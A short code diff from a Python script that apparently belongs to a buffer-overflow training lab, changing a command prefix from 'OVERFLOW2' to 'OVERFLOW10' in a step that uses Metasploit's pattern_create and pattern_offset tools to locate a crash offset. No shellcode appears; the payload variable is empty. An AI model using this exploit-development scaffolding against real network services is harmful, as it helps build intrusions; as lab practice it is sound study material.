@@ -20,8 +20,8 @@ def main(ip: str, port: int, overflow_threshold: int) -> None:
 	pattern_offset = '/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb'  # CHANGE IF NECESSARY
 
 	# Define prefix and buffer with encoded cyclic pattern
-	prefix = b"OVERFLOW2 "	
-	# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <size>															# CHANGE IF NECESSARY
+	prefix = b"OVERFLOW10 "	# CHANGE
+	# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <size>
 	cyclic_pattern = subprocess.check_output([pattern_create, '-l', overflow_threshold])
 	buffer = cyclic_pattern.decode('utf-8').rstrip('\n').encode('utf-8')
 	payload = b""
